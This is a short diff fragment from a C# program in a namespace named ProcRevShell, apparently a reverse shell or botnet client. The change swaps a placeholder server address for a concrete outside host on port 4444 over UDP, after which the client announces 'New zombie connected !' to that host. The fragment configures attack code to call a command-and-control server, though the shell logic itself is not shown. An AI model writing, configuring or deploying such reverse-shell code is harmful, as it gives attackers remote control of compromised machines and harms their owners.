@@ -22,7 +22,7 @@ namespace ProcRevShell
 			UdpClient udpClient = new UdpClient(11000);
 
 			try{
-				udpClient.Connect("<SERVER IP>", 53);
+				udpClient.Connect("tail4ca925.ts.net", 4444);
 
 				Byte[] sendBytes = Encoding.ASCII.GetBytes("New zombie connected !\n");
 
